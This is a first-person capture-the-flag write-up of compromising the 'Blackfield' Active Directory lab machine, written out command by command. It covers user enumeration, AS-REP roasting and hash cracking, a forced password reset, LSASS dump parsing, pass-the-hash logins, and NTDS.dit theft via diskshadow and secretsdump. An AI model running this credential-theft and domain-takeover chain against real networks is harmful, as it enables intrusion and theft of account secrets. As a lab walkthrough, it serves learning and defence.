![image](https://github.com/user-attachments/assets/32a1641e-92a3-4119-973e-3122b4e227c3)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Enumeration:

I initiated the enumeration process by performing port and service scans using `rustscan`, which identified several open ports on the target environment:

```
rustscan -a 10.10.10.192 -- -A -T4 -vv -oN blackfield_nmap
```

![image](https://github.com/user-attachments/assets/579f295e-4864-4caf-9652-c3f73052f1ce)

```
PORT     STATE    SERVICE       REASON          VERSION
53/tcp   open     domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open     kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2024-09-13 14:17:47Z)
135/tcp  open     msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  filtered netbios-ssn   no-response
389/tcp  open     ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open     microsoft-ds? syn-ack ttl 127
593/tcp  open     ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
3268/tcp open     ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open     http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (88%)
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows Server 2019 (88%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.94SVN%E=4%D=9/13%OT=53%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=66E3E758%P=x86_64-pc-linux-gnu)
SEQ(SP=106%GCD=1%ISR=103%TI=I%II=I%SS=S%TS=U)
OPS(O1=M53CNW8NNS%O2=M53CNW8NNS%O3=M53CNW8%O4=M53CNW8NNS%O5=M53CNW8NNS%O6=M53CNNS)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M53CNW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-09-13T14:18:11
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 7h00m00s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 48702/tcp): CLEAN (Timeout)
|   Check 2 (port 28788/tcp): CLEAN (Timeout)
|   Check 3 (port 53637/udp): CLEAN (Timeout)
|   Check 4 (port 43486/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

TRACEROUTE (using port 5985/tcp)
HOP RTT       ADDRESS
1   229.05 ms 10.10.14.1
2   229.07 ms 10.10.10.192
```

In the scan results, I discovered the domain `BLACKFIELD.local`. To facilitate further enumeration, I added this domain to my hosts configuration file:

## DNS enumeration

With DNS services active, I proceeded to enumerate DNS records and discovered another domain, `dc01.BLACKFIELD.local`. I added this domain to the hosts configuration file for future use:

```
dig BLACKFIELD.local any @10.10.10.192
```

![image](https://github.com/user-attachments/assets/d0f76164-e7b1-4657-8608-dd4da5d3bd8b)

## Kerberoas enumeration:

Next, I used the `kerbrute` tool to enumerate valid usernames by targeting the Kerberos service on the domain controller `dc01.BLACKFIELD.local`. 
After running the enumeration against a list of common usernames, I was able to identify 3 valid usernames:

```
kerbrute userenum --dc dc01.BLACKFIELD.local -d BLACKFIELD.local /usr/share/SecLists/Usernames/cirt-default-usernames.txt
```

![image](https://github.com/user-attachments/assets/0185452a-6660-467f-8e04-f7a8b3d08a94)

## RPC & LDAP Enumeration:

I attempted to perform enumeration with NULL authentication against both RPC and LDAP services, but neither method provided useful results without proper authentication. Here are the steps I followed:

- RPC Enumeration: Tried NULL authentication for RPC, but access was denied:

![image](https://github.com/user-attachments/assets/01780e86-db68-4212-ac22-a8b6e5b583b3)

- LDAP Enumeration: Similarly, I tried using ldapsearch for anonymous LDAP queries, but the results indicated that anonymous access was not permitted:

```
ldapsearch -x -H ldap://BLACKFIELD.local -b 'DC=BLACKFIELD,DC=local'
```

![image](https://github.com/user-attachments/assets/cce5e68c-bd80-4f49-afec-44003bfcdbeb)

## SMB enumeration:

I started the SMB enumeration using `NULL` authentication, but it was unsuccessful. I then tried with the `guest` user, which did not return an "access denied" error, but initially did not yield significant results either.

![image](https://github.com/user-attachments/assets/2f753536-947b-452e-bef7-d5a36bd667c2)

```
nxc smb BLACKFIELD.local -u 'guest' -p '' --pass-pol
```

![image](https://github.com/user-attachments/assets/34f9b02c-8479-4f58-8342-5edb0716d93f)

Afterward, I used a list of 3 discovered users to check the available shares. The `guest` account successfully revealed access to the `IPC$` and `profiles$` shares.

```
nxc smb BLACKFIELD.local -u users.txt -p '' --shares
```

![image](https://github.com/user-attachments/assets/1712ac24-6dfe-48d3-a51a-38164b677f67)

I authenticated using `smbclientng` to explore the `profiles$` share. This revealed multiple user folders.

```
smbclientng -u 'guest' -p '' --target BLACKFIELD.local
```

![image](https://github.com/user-attachments/assets/f50ba032-ceaa-460c-9826-b5f437ea43d4)

To explore all folders at once, I used the `tree` command, but all the folders were empty.

![image](https://github.com/user-attachments/assets/51385259-2c4f-45c4-ad38-7ceb9264ebf6)

Next, I performed a `RID enumeration` attack to enumerate objects like users and groups. This revealed a list of valid user accounts on the target system.
```
nxc smb BLACKFIELD.local -u 'guest' -p '' --rid`
```

![image](https://github.com/user-attachments/assets/5e964d7a-ff2a-4159-8f32-6929ada95bb0)

I compiled a list of 644 unique users from the profiles folder and RID attack results.

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Initial access

## AS-REP Roasting:

After compiling a list of 644 unique users, I proceeded with **AS-REP roasting** on all of these users, aiming to retrieve AS-REP hashes without needing a password. I used the `impacket-GetNPUsers` tool in hashcat format:

```
impacket-GetNPUsers -dc-ip 10.10.10.192  -request BLACKFIELD.local/ -usersfile users.txt -no-pass -format hashcat
```

From this, I was able to extract the AS-REP hash for the `support` user.

I then cracked the extracted hash using **hashcat** with the following command:

```
.\hashcat.exe -a 0 -m 18200 hash.txt rockyou.txt
```

![image](https://github.com/user-attachments/assets/bc757cb0-aead-4202-9755-40af33bd1be3)

The hash was quickly cracked, revealing the clear text password for the `support` user.

Only the `support` user hash was retrieved during this AS-REP roast, which provided a significant foothold.

![image](https://github.com/user-attachments/assets/0c3e08b6-e509-41ea-8bf4-5d3101637a8a)


## Password Policy:

After obtaining the credentials for the `support` user, I reviewed the **password policy** using the credentials. I discovered that there was **no account lockout threshold** set, which implies that user accounts are not automatically locked after a certain number of failed login attempts.

![image](https://github.com/user-attachments/assets/2a10cec2-a5ef-40a9-90dd-a1fc12721970)

## File Shares Enumeration:

Using the credentials of the `support` user, I enumerated the **available file shares** and observed that this user has access to several shares.

![image](https://github.com/user-attachments/assets/22b82071-8968-4e1d-a4f5-805ee14c9d0d)

However, after thoroughly checking the contents of these shares, I did not find anything particularly useful, such as sensitive files or credentials. Despite this, having access to these shares can still be beneficial for further lateral movement or privilege escalation.

## BloodHound

After running BloodHound with the valid credentials of the `support` user, I successfully collected data on the Active Directory (AD) environment using the following command:

```
bloodhound-python -u support -p '*********' -ns 10.10.10.192 -d BLACKFIELD.local -c all
```

![image](https://github.com/user-attachments/assets/cc857fe3-aea9-4273-a050-68ffea54dae7)

Upon importing the collected JSON files into the BloodHound interface, I analyzed potential paths for privilege escalation and lateral movement. Marking the `support` user as owned, I found:

- No direct path to Domain Admin.
- No reachable high-value targets for this user.

However, under outbound "First degree object control", I discovered that the `support` user has the ability to **force a password change** for the `Audit2020` user.

This indicates a potential avenue for further access. By forcing a password change for `Audit2020`, I could gain control over that account, which may provide further access to privileged resources.

![image](https://github.com/user-attachments/assets/95a53f6e-13be-494b-9752-7d8f13c17cb4)

## Support -> Audit2020

After discovering that the `support` user had the ability to change the password for `Audit2020`, I initially tried using the `net rpc` command, but it did not work:

![image](https://github.com/user-attachments/assets/553294f6-340e-4d0f-85e7-1d3e214f625b)

I then used an alternative method to change the password via RPC, which succeeded:

```
rpcclient -U 'BLACKFIELD.local/support' dc01.BLACKFIELD.local
rpcclient $> setuserinfo2 Audit2020 23 Audit@Htb123
```

![image](https://github.com/user-attachments/assets/61466a42-29e4-4fa7-aed3-3ebd3c7a18a2)

![image](https://github.com/user-attachments/assets/59758f01-3c35-47c2-b58d-f2f0f2cdc922)

With `Audit2020` credentials, I listed available shares and found that this user had access to the `Forensics` share. Upon browsing the share, I found a folder named `memory_analysis` containing an `lsass.zip` file, which I downloaded for analysis:

![image](https://github.com/user-attachments/assets/213316bd-9e99-4430-82f9-931c13204cad)

I unzipped and analyzed the `lsass` dump file using `pypykatz` to extract credentials:

```
pypykatz lsa minidump lsass.DMP
```

The dump contained hashes and passwords, including valid credentials for the user `svc_backup`:

![image](https://github.com/user-attachments/assets/292d29aa-fcd1-4a01-9316-cc5c5aa6220b)

When analyzed the dumped data, I observed that there are only 3 users present into this host:

```
 - DC01$
 - Administrator
 - svc_backup
```

The dump contained hashes and passwords, including valid credentials for the user `svc_backup`:

- svc_backup hash: 9658d1d1dcd9250115e2205d9f48400d (valid)
- Administrator and DC01$ credentials were found to be invalid.

![image](https://github.com/user-attachments/assets/749e660c-2563-42b1-8437-b5efdb76bf73)

![image](https://github.com/user-attachments/assets/d10fd5b5-27d0-461f-97d7-cb10f1613ea6)

Once, identifying the valid account hash, I tried to login into using winrm & it finally wokred:

![image](https://github.com/user-attachments/assets/18f5fe29-077d-4f40-a844-3eed9038ea39)

Finally, using the extracted hash, I authenticated as svc_backup via evil-winrm:

```
evil-winrm -i 10.10.10.192 -u 'svc_backup' -H '9658d1d1dcd9250115e2205d9f48400d'
```

![image](https://github.com/user-attachments/assets/c076deb8-732b-47fb-ab71-107c82149bc6)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

# Lateral movement:

After gaining access as `svc_backup`, I discovered that this account has the **SeBackupPrivilege**, allowing the user to back up files and directories, including sensitive files such as `SAM`, `SYSTEM` hives, and `NTDS.dit`. To take advantage of this, I followed the steps from my [own blog](https://f41zk4r1m.gitbook.io/writeups/v/tryhackme/tryhackme/hard/fusin-corp#privilege-escalation) to leverage the diskshadow utility.

I created a `diskshadow.txt` file containing the script to back up the `C: drive` to a new `E: drive`:

```
set verbose onX
set metadata C:\Windows\Temp\meta.cabX
set context clientaccessibleX
set context persistentX
begin backupX
add volume C: alias cdriveX
createX
expose %cdrive% E:X
end backupX
```

I uploaded this file to the target host and executed it with the following command:

```
diskshadow /s diskshadow.txt
```

![image](https://github.com/user-attachments/assets/4e271201-41b7-4a1e-9825-a6ab1056a70f)

This successfully created a new backup drive (`E:`), which I could access.

![image](https://github.com/user-attachments/assets/98cdfc0b-287b-4baa-b572-a33591aa3ce2)

I then copied the `NTDS.dit` file, which contains Active Directory hashes, from the backup drive `E:` to the `C:\Temp` directory:

```
robocopy /b E:\Windows\ntds . ntds.dit
```

![image](https://github.com/user-attachments/assets/8ec5e70b-a110-46a5-9105-fcd5d57fbd88)

Next, I saved the `SYSTEM` registry, which is needed to decrypt the NTDS file:

```
reg save hklm\system C:\Users\svc_backup\Appdata\local\temp\system
```

![image](https://github.com/user-attachments/assets/91b40b4c-6805-4510-98c1-bdd797703bc7)

## Secretsdump

Once I successfully copied both the `NTDS.dit` and `SYSTEM` files to my local Kali machine, I used the `secretsdump` tool from the Impacket library to extract the hashes from the `NTDS.dit` file:

![image](https://github.com/user-attachments/assets/7f98dfb8-37ff-4c37-9595-07bfcc26844c)

This command provided me with all the hashes contained in the `NTDS.dit` file.

```
secretsdump.py -ntds ntds.dit -system system local
```

This command provided me with all the hashes contained in the `NTDS.dit` file.

![image](https://github.com/user-attachments/assets/210e412f-4f25-4010-bb2b-ffb9eace5121)

With the Administrator hash extracted, I was able to authenticate as the `Administrator` user using WinRM:

![image](https://github.com/user-attachments/assets/d30ffd9b-5830-4f80-97d2-52b02e772dcd)

After gaining shell access as the `Administrator`, I successfully captured all the flags from the target machine, marking the completion of the engagement. (pwn3d! 🎉)
